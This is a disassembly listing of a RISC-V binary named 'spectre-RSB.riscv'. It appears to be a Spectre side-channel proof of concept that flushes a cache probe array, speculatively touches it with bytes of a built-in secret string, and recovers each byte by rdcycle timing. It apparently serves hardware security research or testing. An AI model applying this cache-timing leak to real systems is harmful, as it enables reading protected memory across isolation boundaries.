
bin/spectre-RSB.riscv：     文件格式 elf64-littleriscv


Disassembly of section .text:

00000000000100b0 <register_fini>:
   100b0:	ffff0797          	auipc	a5,0xffff0
   100b4:	f5078793          	addi	a5,a5,-176 # 0 <register_fini-0x100b0>
   100b8:	c799                	beqz	a5,100c6 <register_fini+0x16>
   100ba:	00003517          	auipc	a0,0x3
   100be:	a7450513          	addi	a0,a0,-1420 # 12b2e <__libc_fini_array>
   100c2:	2ad0906f          	j	19b6e <atexit>
   100c6:	8082                	ret

00000000000100c8 <_start>:
   100c8:	00010197          	auipc	gp,0x10
   100cc:	b4018193          	addi	gp,gp,-1216 # 1fc08 <__global_pointer$>
   100d0:	86018513          	addi	a0,gp,-1952 # 1f468 <_edata>
   100d4:	00028617          	auipc	a2,0x28
   100d8:	c2460613          	addi	a2,a2,-988 # 37cf8 <__BSS_END__>
   100dc:	8e09                	sub	a2,a2,a0
   100de:	4581                	li	a1,0
   100e0:	572000ef          	jal	ra,10652 <memset>
   100e4:	0000a517          	auipc	a0,0xa
   100e8:	a8a50513          	addi	a0,a0,-1398 # 19b6e <atexit>
   100ec:	c519                	beqz	a0,100fa <_start+0x32>
   100ee:	00003517          	auipc	a0,0x3
   100f2:	a4050513          	addi	a0,a0,-1472 # 12b2e <__libc_fini_array>
   100f6:	279090ef          	jal	ra,19b6e <atexit>
   100fa:	4ee000ef          	jal	ra,105e8 <__libc_init_array>
   100fe:	4502                	lw	a0,0(sp)
   10100:	002c                	addi	a1,sp,8
   10102:	4601                	li	a2,0
   10104:	27e000ef          	jal	ra,10382 <main>
   10108:	a1c9                	j	105ca <exit>

000000000001010a <__do_global_dtors_aux>:
   1010a:	88818793          	addi	a5,gp,-1912 # 1f490 <completed.5527>
   1010e:	0007c703          	lbu	a4,0(a5)
   10112:	eb0d                	bnez	a4,10144 <__do_global_dtors_aux+0x3a>
   10114:	1141                	addi	sp,sp,-16
   10116:	e022                	sd	s0,0(sp)
   10118:	e406                	sd	ra,8(sp)
   1011a:	843e                	mv	s0,a5
   1011c:	ffff0797          	auipc	a5,0xffff0
   10120:	ee478793          	addi	a5,a5,-284 # 0 <register_fini-0x100b0>
   10124:	cb89                	beqz	a5,10136 <__do_global_dtors_aux+0x2c>
   10126:	0000e517          	auipc	a0,0xe
   1012a:	1c250513          	addi	a0,a0,450 # 1e2e8 <__FRAME_END__>
   1012e:	00000097          	auipc	ra,0x0
   10132:	000000e7          	jalr	zero # 0 <register_fini-0x100b0>
   10136:	4785                	li	a5,1
   10138:	60a2                	ld	ra,8(sp)
   1013a:	00f40023          	sb	a5,0(s0)
   1013e:	6402                	ld	s0,0(sp)
   10140:	0141                	addi	sp,sp,16
   10142:	8082                	ret
   10144:	8082                	ret

0000000000010146 <frame_dummy>:
   10146:	ffff0797          	auipc	a5,0xffff0
   1014a:	eba78793          	addi	a5,a5,-326 # 0 <register_fini-0x100b0>
   1014e:	cb99                	beqz	a5,10164 <frame_dummy+0x1e>
   10150:	89018593          	addi	a1,gp,-1904 # 1f498 <object.5532>
   10154:	0000e517          	auipc	a0,0xe
   10158:	19450513          	addi	a0,a0,404 # 1e2e8 <__FRAME_END__>
   1015c:	00000317          	auipc	t1,0x0
   10160:	00000067          	jr	zero # 0 <register_fini-0x100b0>
   10164:	8082                	ret

0000000000010166 <flushCache>:
   10166:	711d                	addi	sp,sp,-96
   10168:	eca2                	sd	s0,88(sp)
   1016a:	1080                	addi	s0,sp,96
   1016c:	faa43423          	sd	a0,-88(s0)
   10170:	fab43023          	sd	a1,-96(s0)
   10174:	fa043783          	ld	a5,-96(s0)
   10178:	8399                	srli	a5,a5,0x6
   1017a:	fef43423          	sd	a5,-24(s0)
   1017e:	fa043783          	ld	a5,-96(s0)
   10182:	03f7f793          	andi	a5,a5,63
   10186:	c791                	beqz	a5,10192 <flushCache+0x2c>
   10188:	fe843783          	ld	a5,-24(s0)
   1018c:	0785                	addi	a5,a5,1
   1018e:	fef43423          	sd	a5,-24(s0)
   10192:	fe843703          	ld	a4,-24(s0)
   10196:	04000793          	li	a5,64
   1019a:	00e7f663          	bgeu	a5,a4,101a6 <flushCache+0x40>
   1019e:	04000793          	li	a5,64
   101a2:	fef43423          	sd	a5,-24(s0)
   101a6:	fc040ba3          	sb	zero,-41(s0)
   101aa:	000207b7          	lui	a5,0x20
   101ae:	cf078713          	addi	a4,a5,-784 # 1fcf0 <dummyMem>
   101b2:	6791                	lui	a5,0x4
   101b4:	973e                	add	a4,a4,a5
   101b6:	77fd                	lui	a5,0xfffff
   101b8:	8ff9                	and	a5,a5,a4
   101ba:	fcf43423          	sd	a5,-56(s0)
   101be:	fe043023          	sd	zero,-32(s0)
   101c2:	a8b9                	j	10220 <flushCache+0xba>
   101c4:	fa843783          	ld	a5,-88(s0)
   101c8:	8399                	srli	a5,a5,0x6
   101ca:	03f7f713          	andi	a4,a5,63
   101ce:	fe043783          	ld	a5,-32(s0)
   101d2:	97ba                	add	a5,a5,a4
   101d4:	079a                	slli	a5,a5,0x6
   101d6:	fcf43023          	sd	a5,-64(s0)
   101da:	fc043c23          	sd	zero,-40(s0)
   101de:	a03d                	j	1020c <flushCache+0xa6>
   101e0:	fd843783          	ld	a5,-40(s0)
   101e4:	07b2                	slli	a5,a5,0xc
   101e6:	faf43c23          	sd	a5,-72(s0)
   101ea:	fc843703          	ld	a4,-56(s0)
   101ee:	fc043783          	ld	a5,-64(s0)
   101f2:	973e                	add	a4,a4,a5
   101f4:	fb843783          	ld	a5,-72(s0)
   101f8:	97ba                	add	a5,a5,a4
   101fa:	0007c783          	lbu	a5,0(a5) # fffffffffffff000 <__BSS_END__+0xfffffffffffc7308>
   101fe:	fcf40ba3          	sb	a5,-41(s0)
   10202:	fd843783          	ld	a5,-40(s0)
   10206:	0785                	addi	a5,a5,1
   10208:	fcf43c23          	sd	a5,-40(s0)
   1020c:	fd843703          	ld	a4,-40(s0)
   10210:	47bd                	li	a5,15
   10212:	fce7f7e3          	bgeu	a5,a4,101e0 <flushCache+0x7a>
   10216:	fe043783          	ld	a5,-32(s0)
   1021a:	0785                	addi	a5,a5,1
   1021c:	fef43023          	sd	a5,-32(s0)
   10220:	fe043703          	ld	a4,-32(s0)
   10224:	fe843783          	ld	a5,-24(s0)
   10228:	f8f76ee3          	bltu	a4,a5,101c4 <flushCache+0x5e>
   1022c:	0001                	nop
   1022e:	0001                	nop
   10230:	6466                	ld	s0,88(sp)
   10232:	6125                	addi	sp,sp,96
   10234:	8082                	ret

0000000000010236 <topTwoIdx>:
   10236:	7139                	addi	sp,sp,-64
   10238:	fc22                	sd	s0,56(sp)
   1023a:	0080                	addi	s0,sp,64
   1023c:	fca43c23          	sd	a0,-40(s0)
   10240:	fcb43823          	sd	a1,-48(s0)
   10244:	fcc43423          	sd	a2,-56(s0)
   10248:	fcd43023          	sd	a3,-64(s0)
   1024c:	fc043783          	ld	a5,-64(s0)
   10250:	0007b023          	sd	zero,0(a5)
   10254:	fc043783          	ld	a5,-64(s0)
   10258:	07a1                	addi	a5,a5,8
   1025a:	0007b023          	sd	zero,0(a5)
   1025e:	fe043423          	sd	zero,-24(s0)
   10262:	a075                	j	1030e <topTwoIdx+0xd8>
   10264:	fe843783          	ld	a5,-24(s0)
   10268:	078e                	slli	a5,a5,0x3
   1026a:	fd843703          	ld	a4,-40(s0)
   1026e:	97ba                	add	a5,a5,a4
   10270:	6398                	ld	a4,0(a5)
   10272:	fc043783          	ld	a5,-64(s0)
   10276:	639c                	ld	a5,0(a5)
   10278:	04e7f563          	bgeu	a5,a4,102c2 <topTwoIdx+0x8c>
   1027c:	fc043783          	ld	a5,-64(s0)
   10280:	07a1                	addi	a5,a5,8
   10282:	fc043703          	ld	a4,-64(s0)
   10286:	6318                	ld	a4,0(a4)
   10288:	e398                	sd	a4,0(a5)
   1028a:	fe843783          	ld	a5,-24(s0)
   1028e:	078e                	slli	a5,a5,0x3
   10290:	fd843703          	ld	a4,-40(s0)
   10294:	97ba                	add	a5,a5,a4
   10296:	6398                	ld	a4,0(a5)
   10298:	fc043783          	ld	a5,-64(s0)
   1029c:	e398                	sd	a4,0(a5)
   1029e:	fc843783          	ld	a5,-56(s0)
   102a2:	0785                	addi	a5,a5,1
   102a4:	fc843703          	ld	a4,-56(s0)
   102a8:	00074703          	lbu	a4,0(a4)
   102ac:	00e78023          	sb	a4,0(a5)
   102b0:	fe843783          	ld	a5,-24(s0)
   102b4:	0ff7f713          	andi	a4,a5,255
   102b8:	fc843783          	ld	a5,-56(s0)
   102bc:	00e78023          	sb	a4,0(a5)
   102c0:	a091                	j	10304 <topTwoIdx+0xce>
   102c2:	fe843783          	ld	a5,-24(s0)
   102c6:	078e                	slli	a5,a5,0x3
   102c8:	fd843703          	ld	a4,-40(s0)
   102cc:	97ba                	add	a5,a5,a4
   102ce:	6398                	ld	a4,0(a5)
   102d0:	fc043783          	ld	a5,-64(s0)
   102d4:	07a1                	addi	a5,a5,8
   102d6:	639c                	ld	a5,0(a5)
   102d8:	02e7f663          	bgeu	a5,a4,10304 <topTwoIdx+0xce>
   102dc:	fe843783          	ld	a5,-24(s0)
   102e0:	078e                	slli	a5,a5,0x3
   102e2:	fd843703          	ld	a4,-40(s0)
   102e6:	973e                	add	a4,a4,a5
   102e8:	fc043783          	ld	a5,-64(s0)
   102ec:	07a1                	addi	a5,a5,8
   102ee:	6318                	ld	a4,0(a4)
   102f0:	e398                	sd	a4,0(a5)
   102f2:	fc843783          	ld	a5,-56(s0)
   102f6:	0785                	addi	a5,a5,1
   102f8:	fe843703          	ld	a4,-24(s0)
   102fc:	0ff77713          	andi	a4,a4,255
   10300:	00e78023          	sb	a4,0(a5)
   10304:	fe843783          	ld	a5,-24(s0)
   10308:	0785                	addi	a5,a5,1
   1030a:	fef43423          	sd	a5,-24(s0)
   1030e:	fe843703          	ld	a4,-24(s0)
   10312:	fd043783          	ld	a5,-48(s0)
   10316:	f4f767e3          	bltu	a4,a5,10264 <topTwoIdx+0x2e>
   1031a:	0001                	nop
   1031c:	0001                	nop
   1031e:	7462                	ld	s0,56(sp)
   10320:	6121                	addi	sp,sp,64
   10322:	8082                	ret

0000000000010324 <frameDump>:
   10324:	1141                	addi	sp,sp,-16
   10326:	e422                	sd	s0,8(sp)
   10328:	0800                	addi	s0,sp,16
   1032a:	0001                	nop
   1032c:	6422                	ld	s0,8(sp)
   1032e:	0141                	addi	sp,sp,16
   10330:	8082                	ret

0000000000010332 <specFunc>:
   10332:	7139                	addi	sp,sp,-64
   10334:	fc22                	sd	s0,56(sp)
   10336:	0080                	addi	s0,sp,64
   10338:	fca43423          	sd	a0,-56(s0)
   1033c:	fe043423          	sd	zero,-24(s0)
   10340:	fc843783          	ld	a5,-56(s0)
   10344:	0007c783          	lbu	a5,0(a5)
   10348:	fef403a3          	sb	a5,-25(s0)
   1034c:	fe744783          	lbu	a5,-25(s0)
   10350:	2781                	sext.w	a5,a5
   10352:	0067979b          	slliw	a5,a5,0x6
   10356:	2781                	sext.w	a5,a5
   10358:	00034737          	lui	a4,0x34
   1035c:	cf070713          	addi	a4,a4,-784 # 33cf0 <attackArray>
   10360:	97ba                	add	a5,a5,a4
   10362:	0007c783          	lbu	a5,0(a5)
   10366:	fef43423          	sd	a5,-24(s0)
   1036a:	c00027f3          	rdcycle	a5
   1036e:	fcf43c23          	sd	a5,-40(s0)
   10372:	fd843783          	ld	a5,-40(s0)
   10376:	fef43423          	sd	a5,-24(s0)
   1037a:	0001                	nop
   1037c:	7462                	ld	s0,56(sp)
   1037e:	6121                	addi	sp,sp,64
   10380:	8082                	ret

0000000000010382 <main>:
   10382:	7119                	addi	sp,sp,-128
   10384:	fc86                	sd	ra,120(sp)
   10386:	f8a2                	sd	s0,112(sp)
   10388:	0100                	addi	s0,sp,128
   1038a:	fe0407a3          	sb	zero,-17(s0)
   1038e:	67f1                	lui	a5,0x1c
   10390:	4d078513          	addi	a0,a5,1232 # 1c4d0 <__clzdi2+0x5e>
   10394:	436000ef          	jal	ra,107ca <puts>
   10398:	8401b783          	ld	a5,-1984(gp) # 1f448 <secretString>
   1039c:	85be                	mv	a1,a5
   1039e:	67f1                	lui	a5,0x1c
   103a0:	50878513          	addi	a0,a5,1288 # 1c508 <__clzdi2+0x96>
   103a4:	37a000ef          	jal	ra,1071e <printf>
   103a8:	fe043023          	sd	zero,-32(s0)
   103ac:	a421                	j	105b4 <main+0x232>
   103ae:	fc043c23          	sd	zero,-40(s0)
   103b2:	a005                	j	103d2 <main+0x50>
   103b4:	0001f7b7          	lui	a5,0x1f
   103b8:	4c878713          	addi	a4,a5,1224 # 1f4c8 <results.2594>
   103bc:	fd843783          	ld	a5,-40(s0)
   103c0:	078e                	slli	a5,a5,0x3
   103c2:	97ba                	add	a5,a5,a4
   103c4:	0007b023          	sd	zero,0(a5)
   103c8:	fd843783          	ld	a5,-40(s0)
   103cc:	0785                	addi	a5,a5,1
   103ce:	fcf43c23          	sd	a5,-40(s0)
   103d2:	fd843703          	ld	a4,-40(s0)
   103d6:	0ff00793          	li	a5,255
   103da:	fce7fde3          	bgeu	a5,a4,103b4 <main+0x32>
   103de:	fc043823          	sd	zero,-48(s0)
   103e2:	a0c1                	j	104a2 <main+0x120>
   103e4:	000347b7          	lui	a5,0x34
   103e8:	cf078793          	addi	a5,a5,-784 # 33cf0 <attackArray>
   103ec:	6591                	lui	a1,0x4
   103ee:	853e                	mv	a0,a5
   103f0:	d77ff0ef          	jal	ra,10166 <flushCache>
   103f4:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   103f8:	fe043783          	ld	a5,-32(s0)
   103fc:	97ba                	add	a5,a5,a4
   103fe:	853e                	mv	a0,a5
   10400:	f33ff0ef          	jal	ra,10332 <specFunc>
   10404:	fc043423          	sd	zero,-56(s0)
   10408:	a051                	j	1048c <main+0x10a>
   1040a:	c00027f3          	rdcycle	a5
   1040e:	fcf43023          	sd	a5,-64(s0)
   10412:	fc043783          	ld	a5,-64(s0)
   10416:	faf43c23          	sd	a5,-72(s0)
   1041a:	fc843783          	ld	a5,-56(s0)
   1041e:	079a                	slli	a5,a5,0x6
   10420:	00034737          	lui	a4,0x34
   10424:	cf070713          	addi	a4,a4,-784 # 33cf0 <attackArray>
   10428:	97ba                	add	a5,a5,a4
   1042a:	0007c703          	lbu	a4,0(a5)
   1042e:	fef44783          	lbu	a5,-17(s0)
   10432:	8ff9                	and	a5,a5,a4
   10434:	fef407a3          	sb	a5,-17(s0)
   10438:	c00027f3          	rdcycle	a5
   1043c:	faf43823          	sd	a5,-80(s0)
   10440:	fb043703          	ld	a4,-80(s0)
   10444:	fb843783          	ld	a5,-72(s0)
   10448:	40f707b3          	sub	a5,a4,a5
   1044c:	faf43423          	sd	a5,-88(s0)
   10450:	fa843703          	ld	a4,-88(s0)
   10454:	47f5                	li	a5,29
   10456:	02e7e663          	bltu	a5,a4,10482 <main+0x100>
   1045a:	0001f7b7          	lui	a5,0x1f
   1045e:	4c878713          	addi	a4,a5,1224 # 1f4c8 <results.2594>
   10462:	fc843783          	ld	a5,-56(s0)
   10466:	078e                	slli	a5,a5,0x3
   10468:	97ba                	add	a5,a5,a4
   1046a:	639c                	ld	a5,0(a5)
   1046c:	00178713          	addi	a4,a5,1
   10470:	0001f7b7          	lui	a5,0x1f
   10474:	4c878693          	addi	a3,a5,1224 # 1f4c8 <results.2594>
   10478:	fc843783          	ld	a5,-56(s0)
   1047c:	078e                	slli	a5,a5,0x3
   1047e:	97b6                	add	a5,a5,a3
   10480:	e398                	sd	a4,0(a5)
   10482:	fc843783          	ld	a5,-56(s0)
   10486:	0785                	addi	a5,a5,1
   10488:	fcf43423          	sd	a5,-56(s0)
   1048c:	fc843703          	ld	a4,-56(s0)
   10490:	0ff00793          	li	a5,255
   10494:	f6e7fbe3          	bgeu	a5,a4,1040a <main+0x88>
   10498:	fd043783          	ld	a5,-48(s0)
   1049c:	0785                	addi	a5,a5,1
   1049e:	fcf43823          	sd	a5,-48(s0)
   104a2:	fd043703          	ld	a4,-48(s0)
   104a6:	47a5                	li	a5,9
   104a8:	f2e7fee3          	bgeu	a5,a4,103e4 <main+0x62>
   104ac:	fa041023          	sh	zero,-96(s0)
   104b0:	f8043823          	sd	zero,-112(s0)
   104b4:	f8043c23          	sd	zero,-104(s0)
   104b8:	f9040713          	addi	a4,s0,-112
   104bc:	fa040793          	addi	a5,s0,-96
   104c0:	86ba                	mv	a3,a4
   104c2:	863e                	mv	a2,a5
   104c4:	10000593          	li	a1,256
   104c8:	0001f7b7          	lui	a5,0x1f
   104cc:	4c878513          	addi	a0,a5,1224 # 1f4c8 <results.2594>
   104d0:	d67ff0ef          	jal	ra,10236 <topTwoIdx>
   104d4:	fa044683          	lbu	a3,-96(s0)
   104d8:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   104dc:	fe043783          	ld	a5,-32(s0)
   104e0:	97ba                	add	a5,a5,a4
   104e2:	0007c783          	lbu	a5,0(a5)
   104e6:	8736                	mv	a4,a3
   104e8:	00f70e63          	beq	a4,a5,10504 <main+0x182>
   104ec:	fa144683          	lbu	a3,-95(s0)
   104f0:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   104f4:	fe043783          	ld	a5,-32(s0)
   104f8:	97ba                	add	a5,a5,a4
   104fa:	0007c783          	lbu	a5,0(a5)
   104fe:	8736                	mv	a4,a3
   10500:	04f71c63          	bne	a4,a5,10558 <main+0x1d6>
   10504:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   10508:	fe043783          	ld	a5,-32(s0)
   1050c:	00f705b3          	add	a1,a4,a5
   10510:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   10514:	fe043783          	ld	a5,-32(s0)
   10518:	97ba                	add	a5,a5,a4
   1051a:	0007c783          	lbu	a5,0(a5)
   1051e:	0007861b          	sext.w	a2,a5
   10522:	f9043683          	ld	a3,-112(s0)
   10526:	fa044783          	lbu	a5,-96(s0)
   1052a:	0007871b          	sext.w	a4,a5
   1052e:	fa044783          	lbu	a5,-96(s0)
   10532:	0007851b          	sext.w	a0,a5
   10536:	f9843803          	ld	a6,-104(s0)
   1053a:	fa144783          	lbu	a5,-95(s0)
   1053e:	0007889b          	sext.w	a7,a5
   10542:	fa144783          	lbu	a5,-95(s0)
   10546:	2781                	sext.w	a5,a5
   10548:	e03e                	sd	a5,0(sp)
   1054a:	87aa                	mv	a5,a0
   1054c:	6571                	lui	a0,0x1c
   1054e:	52050513          	addi	a0,a0,1312 # 1c520 <__clzdi2+0xae>
   10552:	1cc000ef          	jal	ra,1071e <printf>
   10556:	a891                	j	105aa <main+0x228>
   10558:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   1055c:	fe043783          	ld	a5,-32(s0)
   10560:	00f705b3          	add	a1,a4,a5
   10564:	8401b703          	ld	a4,-1984(gp) # 1f448 <secretString>
   10568:	fe043783          	ld	a5,-32(s0)
   1056c:	97ba                	add	a5,a5,a4
   1056e:	0007c783          	lbu	a5,0(a5)
   10572:	0007861b          	sext.w	a2,a5
   10576:	f9043683          	ld	a3,-112(s0)
   1057a:	fa044783          	lbu	a5,-96(s0)
   1057e:	0007871b          	sext.w	a4,a5
   10582:	fa044783          	lbu	a5,-96(s0)
   10586:	0007851b          	sext.w	a0,a5
   1058a:	f9843803          	ld	a6,-104(s0)
   1058e:	fa144783          	lbu	a5,-95(s0)
   10592:	0007889b          	sext.w	a7,a5
   10596:	fa144783          	lbu	a5,-95(s0)
   1059a:	2781                	sext.w	a5,a5
   1059c:	e03e                	sd	a5,0(sp)
   1059e:	87aa                	mv	a5,a0
   105a0:	6571                	lui	a0,0x1c
   105a2:	58050513          	addi	a0,a0,1408 # 1c580 <__clzdi2+0x10e>
   105a6:	178000ef          	jal	ra,1071e <printf>
   105aa:	fe043783          	ld	a5,-32(s0)
   105ae:	0785                	addi	a5,a5,1
   105b0:	fef43023          	sd	a5,-32(s0)
   105b4:	fe043703          	ld	a4,-32(s0)
   105b8:	47e5                	li	a5,25
   105ba:	dee7fae3          	bgeu	a5,a4,103ae <main+0x2c>
   105be:	4781                	li	a5,0
   105c0:	853e                	mv	a0,a5
   105c2:	70e6                	ld	ra,120(sp)
   105c4:	7446                	ld	s0,112(sp)
   105c6:	6109                	addi	sp,sp,128
   105c8:	8082                	ret

00000000000105ca <exit>:
   105ca:	1141                	addi	sp,sp,-16
   105cc:	4581                	li	a1,0
   105ce:	e022                	sd	s0,0(sp)
   105d0:	e406                	sd	ra,8(sp)
   105d2:	842a                	mv	s0,a0
   105d4:	03c020ef          	jal	ra,12610 <__call_exitprocs>
   105d8:	8301b503          	ld	a0,-2000(gp) # 1f438 <_global_impure_ptr>
   105dc:	6d3c                	ld	a5,88(a0)
   105de:	c391                	beqz	a5,105e2 <exit+0x18>
   105e0:	9782                	jalr	a5
   105e2:	8522                	mv	a0,s0
   105e4:	0bf0a0ef          	jal	ra,1aea2 <_exit>

00000000000105e8 <__libc_init_array>:
   105e8:	1101                	addi	sp,sp,-32
   105ea:	e822                	sd	s0,16(sp)
   105ec:	e04a                	sd	s2,0(sp)
   105ee:	0000e417          	auipc	s0,0xe
   105f2:	cfe40413          	addi	s0,s0,-770 # 1e2ec <__preinit_array_end>
   105f6:	0000e917          	auipc	s2,0xe
   105fa:	cf690913          	addi	s2,s2,-778 # 1e2ec <__preinit_array_end>
   105fe:	40890933          	sub	s2,s2,s0
   10602:	ec06                	sd	ra,24(sp)
   10604:	e426                	sd	s1,8(sp)
   10606:	40395913          	srai	s2,s2,0x3
   1060a:	00090963          	beqz	s2,1061c <__libc_init_array+0x34>
   1060e:	4481                	li	s1,0
   10610:	601c                	ld	a5,0(s0)
   10612:	0485                	addi	s1,s1,1
   10614:	0421                	addi	s0,s0,8
   10616:	9782                	jalr	a5
   10618:	fe991ce3          	bne	s2,s1,10610 <__libc_init_array+0x28>
   1061c:	0000e417          	auipc	s0,0xe
   10620:	cd440413          	addi	s0,s0,-812 # 1e2f0 <__init_array_start>
   10624:	0000e917          	auipc	s2,0xe
   10628:	cdc90913          	addi	s2,s2,-804 # 1e300 <__init_array_end>
   1062c:	40890933          	sub	s2,s2,s0
   10630:	40395913          	srai	s2,s2,0x3
   10634:	00090963          	beqz	s2,10646 <__libc_init_array+0x5e>
   10638:	4481                	li	s1,0
   1063a:	601c                	ld	a5,0(s0)
   1063c:	0485                	addi	s1,s1,1
   1063e:	0421                	addi	s0,s0,8
   10640:	9782                	jalr	a5
   10642:	fe991ce3          	bne	s2,s1,1063a <__libc_init_array+0x52>
   10646:	60e2                	ld	ra,24(sp)
   10648:	6442                	ld	s0,16(sp)
   1064a:	64a2                	ld	s1,8(sp)
   1064c:	6902                	ld	s2,0(sp)
   1064e:	6105                	addi	sp,sp,32
   10650:	8082                	ret

0000000000010652 <memset>:
   10652:	433d                	li	t1,15
   10654:	872a                	mv	a4,a0
   10656:	02c37163          	bgeu	t1,a2,10678 <memset+0x26>
   1065a:	00f77793          	andi	a5,a4,15
   1065e:	e3c1                	bnez	a5,106de <memset+0x8c>
   10660:	e1bd                	bnez	a1,106c6 <memset+0x74>
   10662:	ff067693          	andi	a3,a2,-16
   10666:	8a3d                	andi	a2,a2,15
   10668:	96ba                	add	a3,a3,a4
   1066a:	e30c                	sd	a1,0(a4)
   1066c:	e70c                	sd	a1,8(a4)
   1066e:	0741                	addi	a4,a4,16
   10670:	fed76de3          	bltu	a4,a3,1066a <memset+0x18>
   10674:	e211                	bnez	a2,10678 <memset+0x26>
   10676:	8082                	ret
   10678:	40c306b3          	sub	a3,t1,a2
   1067c:	068a                	slli	a3,a3,0x2
   1067e:	00000297          	auipc	t0,0x0
   10682:	9696                	add	a3,a3,t0
   10684:	00a68067          	jr	10(a3)
   10688:	00b70723          	sb	a1,14(a4)
   1068c:	00b706a3          	sb	a1,13(a4)
   10690:	00b70623          	sb	a1,12(a4)
   10694:	00b705a3          	sb	a1,11(a4)
   10698:	00b70523          	sb	a1,10(a4)
   1069c:	00b704a3          	sb	a1,9(a4)
   106a0:	00b70423          	sb	a1,8(a4)
   106a4:	00b703a3          	sb	a1,7(a4)
   106a8:	00b70323          	sb	a1,6(a4)
   106ac:	00b702a3          	sb	a1,5(a4)
   106b0:	00b70223          	sb	a1,4(a4)
   106b4:	00b701a3          	sb	a1,3(a4)
   106b8:	00b70123          	sb	a1,2(a4)
   106bc:	00b700a3          	sb	a1,1(a4)
   106c0:	00b70023          	sb	a1,0(a4)
   106c4:	8082                	ret
   106c6:	0ff5f593          	andi	a1,a1,255
   106ca:	00859693          	slli	a3,a1,0x8
   106ce:	8dd5                	or	a1,a1,a3
   106d0:	01059693          	slli	a3,a1,0x10
   106d4:	8dd5                	or	a1,a1,a3
   106d6:	02059693          	slli	a3,a1,0x20
   106da:	8dd5                	or	a1,a1,a3
   106dc:	b759                	j	10662 <memset+0x10>
   106de:	00279693          	slli	a3,a5,0x2
   106e2:	00000297          	auipc	t0,0x0
   106e6:	9696                	add	a3,a3,t0
   106e8:	8286                	mv	t0,ra
   106ea:	fa2680e7          	jalr	-94(a3)
   106ee:	8096                	mv	ra,t0
   106f0:	17c1                	addi	a5,a5,-16
   106f2:	8f1d                	sub	a4,a4,a5
   106f4:	963e                	add	a2,a2,a5
   106f6:	f8c371e3          	bgeu	t1,a2,10678 <memset+0x26>
   106fa:	b79d                	j	10660 <memset+0xe>

00000000000106fc <_printf_r>:
   106fc:	715d                	addi	sp,sp,-80
   106fe:	f032                	sd	a2,32(sp)
   10700:	f436                	sd	a3,40(sp)
   10702:	f83a                	sd	a4,48(sp)
   10704:	fc3e                	sd	a5,56(sp)
   10706:	e0c2                	sd	a6,64(sp)
   10708:	e4c6                	sd	a7,72(sp)
   1070a:	862e                	mv	a2,a1
   1070c:	690c                	ld	a1,16(a0)
   1070e:	1014                	addi	a3,sp,32
   10710:	ec06                	sd	ra,24(sp)
   10712:	e436                	sd	a3,8(sp)
   10714:	152000ef          	jal	ra,10866 <_vfprintf_r>
   10718:	60e2                	ld	ra,24(sp)
   1071a:	6161                	addi	sp,sp,80
   1071c:	8082                	ret

000000000001071e <printf>:
   1071e:	711d                	addi	sp,sp,-96
   10720:	f832                	sd	a2,48(sp)
   10722:	fc36                	sd	a3,56(sp)
   10724:	8481b303          	ld	t1,-1976(gp) # 1f450 <_impure_ptr>
   10728:	f42e                	sd	a1,40(sp)
   1072a:	e0ba                	sd	a4,64(sp)
   1072c:	e4be                	sd	a5,72(sp)
   1072e:	e8c2                	sd	a6,80(sp)
   10730:	ecc6                	sd	a7,88(sp)
   10732:	01033583          	ld	a1,16(t1) # 1016c <flushCache+0x6>
   10736:	1034                	addi	a3,sp,40
   10738:	862a                	mv	a2,a0
   1073a:	851a                	mv	a0,t1
   1073c:	ec06                	sd	ra,24(sp)
   1073e:	e436                	sd	a3,8(sp)
   10740:	126000ef          	jal	ra,10866 <_vfprintf_r>
   10744:	60e2                	ld	ra,24(sp)
   10746:	6125                	addi	sp,sp,96
   10748:	8082                	ret

000000000001074a <_puts_r>:
   1074a:	7159                	addi	sp,sp,-112
   1074c:	f0a2                	sd	s0,96(sp)
   1074e:	842a                	mv	s0,a0
   10750:	852e                	mv	a0,a1
   10752:	eca6                	sd	s1,88(sp)
   10754:	f486                	sd	ra,104(sp)
   10756:	84ae                	mv	s1,a1
   10758:	07a000ef          	jal	ra,107d2 <strlen>
   1075c:	00150713          	addi	a4,a0,1
   10760:	0000c697          	auipc	a3,0xc
   10764:	e8068693          	addi	a3,a3,-384 # 1c5e0 <__clzdi2+0x16e>
   10768:	f43a                	sd	a4,40(sp)
   1076a:	483c                	lw	a5,80(s0)
   1076c:	1818                	addi	a4,sp,48
   1076e:	e0b6                	sd	a3,64(sp)
   10770:	ec3a                	sd	a4,24(sp)
   10772:	4685                	li	a3,1
   10774:	4709                	li	a4,2
   10776:	f826                	sd	s1,48(sp)
   10778:	fc2a                	sd	a0,56(sp)
   1077a:	e4b6                	sd	a3,72(sp)
   1077c:	d03a                	sw	a4,32(sp)
   1077e:	680c                	ld	a1,16(s0)
   10780:	cf8d                	beqz	a5,107ba <_puts_r+0x70>
   10782:	01059783          	lh	a5,16(a1) # 4010 <register_fini-0xc0a0>
   10786:	03279713          	slli	a4,a5,0x32
   1078a:	00074d63          	bltz	a4,107a4 <_puts_r+0x5a>
   1078e:	0ac5a703          	lw	a4,172(a1)
   10792:	6689                	lui	a3,0x2
   10794:	8fd5                	or	a5,a5,a3
   10796:	76f9                	lui	a3,0xffffe
   10798:	16fd                	addi	a3,a3,-1
   1079a:	8f75                	and	a4,a4,a3
   1079c:	00f59823          	sh	a5,16(a1)
   107a0:	0ae5a623          	sw	a4,172(a1)
   107a4:	0830                	addi	a2,sp,24
   107a6:	8522                	mv	a0,s0
   107a8:	6dc020ef          	jal	ra,12e84 <__sfvwrite_r>
   107ac:	ed09                	bnez	a0,107c6 <_puts_r+0x7c>
   107ae:	4529                	li	a0,10
   107b0:	70a6                	ld	ra,104(sp)
   107b2:	7406                	ld	s0,96(sp)
   107b4:	64e6                	ld	s1,88(sp)
   107b6:	6165                	addi	sp,sp,112
   107b8:	8082                	ret
   107ba:	8522                	mv	a0,s0
   107bc:	e42e                	sd	a1,8(sp)
   107be:	344020ef          	jal	ra,12b02 <__sinit>
   107c2:	65a2                	ld	a1,8(sp)
   107c4:	bf7d                	j	10782 <_puts_r+0x38>
   107c6:	557d                	li	a0,-1
   107c8:	b7e5                	j	107b0 <_puts_r+0x66>

00000000000107ca <puts>:
   107ca:	85aa                	mv	a1,a0
   107cc:	8481b503          	ld	a0,-1976(gp) # 1f450 <_impure_ptr>
   107d0:	bfad                	j	1074a <_puts_r>

00000000000107d2 <strlen>:
